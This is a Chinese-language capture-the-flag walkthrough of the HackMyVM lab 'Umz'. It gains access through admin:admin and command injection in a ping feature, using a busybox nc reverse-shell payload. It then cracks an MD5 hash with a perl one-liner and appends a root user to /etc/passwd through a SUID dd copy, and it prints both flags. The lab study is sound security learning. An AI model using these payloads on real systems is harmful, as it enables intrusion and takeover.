靶机地址：https://hackmyvm.eu/machines/machine.php?vm=Umz

![image-20250804203716777](http://7r1UMPHK.github.io/image/20250804203743076.webp)

# **一、信息收集**

## 1. 主机发现

首先，在本地网络中使用 `arp-scan` 工具扫描存活主机，确定目标靶机的 IP 地址为 `192.168.205.243`。

```bash
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan -l
...
192.168.205.243 08:00:27:9a:39:0d       PCS Systemtechnik GmbH
...
```

## 2. 端口与服务扫描

使用 `nmap` 对目标主机进行全端口扫描，发现其初始开放了 22 (SSH) 和 80 (HTTP) 两个端口。

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p- 192.168.205.243
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-04 08:37 EDT
Nmap scan report for 192.168.205.243
Host is up (0.000099s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

## 3. Web 服务探索

访问 80 端口是一个静态网页。

![image-20250804203832718](http://7r1UMPHK.github.io/image/20250804203833086.webp)

这贴脸开大，嘲讽我们ddos不行的，就满足他

```
gobuster dir -k -t 200000 -u http://192.168.205.243 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip
```

扫描一波就挂了。

重新进行端口扫描发现，服务端口已从 80 切换到了 8080。

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p- 192.168.205.243
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-04 08:40 EDT
Nmap scan report for 192.168.205.243
Host is up (0.000089s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
```

访问 `http://192.168.205.243:8080`，发现一个登录页面。

# **二、初始访问**

## 1. 漏洞利用

尝试使用弱口令 `admin:admin` 成功登录后台。后台提供一个 `ping` 功能，测试发现存在命令注入漏洞。通过使用分号 `;` 可以拼接并执行任意系统命令。

```text
Payload: ; id
```

## 2. 获取 Shell

利用该命令注入漏洞，执行反向 Shell 命令，成功在本地 Kali 监听的端口上接收到 Shell。

*   **攻击机（Kali）监听:**
    ```bash
    ┌──(kali㉿kali)-[~]
    └─$ nc -lvnp 8888
    listening on [any] 8888 ...
    ```

*   **Web 页面注入 Payload:**
    ```text
    ;busybox nc 192.168.205.128 8888 -e /bin/bash
    ```

成功获取 `welcome` 用户的 Shell。为方便后续操作，使用 `stty` 将其升级为功能完整的交互式 TTY。

```bash
# 稳定 Shell
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 34 columns 120
```

进入 `welcome` 用户家目录，读取第一个 flag。

```bash
welcome@Umz:~$ cat /home/welcome/user.txt
flag{user-4483f72525b3c316704cf126bec02d5c}
```

# **三、权限提升**

## 1. 横向移动: welcome -> umzyyds

首先，检查当前用户的 `sudo` 权限，发现 `welcome` 用户可以免密执行 `/usr/bin/md5sum`。

```bash
welcome@Umz:~$ sudo -l
User welcome may run the following commands on Umz:
    (ALL) NOPASSWD: /usr/bin/md5sum
```

在系统中进行枚举，于 `/opt/flask-debug/` 目录下发现一个名为 `umz.pass` 的敏感文件。使用 `sudo` 权限读取其 MD5 哈希值。

```bash
welcome@Umz:/opt/flask-debug$ sudo /usr/bin/md5sum umz.pass
a963fadd7fd379f9bc294ad0ba44f659  umz.pass
```

尝试使用 `john` 爆破该哈希值未果。考虑到 Linux 文件常以换行符 `\n` 结尾，这可能会影响哈希计算。使用 `perl` 脚本结合 `rockyou.txt` 字典，在计算哈希时包含换行符，成功破解出密码。

```bash
┌──(kali㉿kali)-[~]
└─$ perl -MDigest::MD5=md5_hex -nE 'print $_ if md5_hex($_) eq "a963fadd7fd379f9bc294ad0ba44f659"' /usr/share/wordlists/rockyou.txt
sunshine3
```

密码为 `sunshine3`。通过 `ls /home` 发现存在另一个用户 `umzyyds`。使用破解出的密码成功切换到 `umzyyds` 用户。

```bash
welcome@Umz:~$ su umzyyds
Password: sunshine3
umzyyds@Umz:/home/welcome$
```

## 2. 垂直提升: umzyyds -> root

切换到 `umzyyds` 用户后，在其家目录中发现一个拥有 `SUID` 权限的可执行文件 `Dashazi`。

```bash
umzyyds@Umz:~$ ls -al
...
-rwsr-sr-x 1 root    root    76712 May  3 10:42 Dashazi
...
```

使用 `strings` 命令分析该文件，发现其包含了大量与 `dd` 命令相关的字符串，可以断定 `Dashazi` 就是 `dd` 命令的副本。

由于该文件具有 SUID root 权限，任何用户执行它时都将获得 root 身份。我们可以利用它以 root 权限写入系统关键文件，如 `/etc/passwd`，从而创建一个新的 root 用户。

**提权步骤:**

1.  构造一个新的用户条目，用户名为 `b`，密码为`abcdefg`，UID 和 GID 均为 `0` (root 权限)。
2.  使用 `echo` 和管道，将该条目作为 `Dashazi` (dd) 的输入。
3.  指定输出文件 (`of`) 为 `/etc/passwd`，并使用 `oflag=append` 和 `conv=notrunc` 选项以追加模式写入，避免覆盖原文件。

```bash
umzyyds@Umz:~$ echo 'b:$1$AydoDDh4$tEky6m30.0nY3HZ8FgoGI0:0:0::/root:/bin/bash' | ./Dashazi of=/etc/passwd conv=notrunc oflag=append
0+1 records in
0+1 records out
37 bytes copied, 0.000106 s, 349 kB/s
```

# **四、夺取旗帜**

成功向 `/etc/passwd` 文件中添加了新的 root 用户 `hacker` 后，直接切换到该用户，即可获得 root 权限。

```bash
umzyyds@Umz:~$ su b
Password:
root@Umz:/home/umzyyds# id
uid=0(root) gid=0(root) groups=0(root)
```

最后，读取 `root.txt` 获取最终的 flag，完成渗透。

```bash
root@Umz:/home/umzyyds# cat /root/root.txt /home/welcome/user.txt 
flag{root-a73c45107081c08dd4560206b8ef8205}
flag{user-4483f72525b3c316704cf126bec02d5c}
```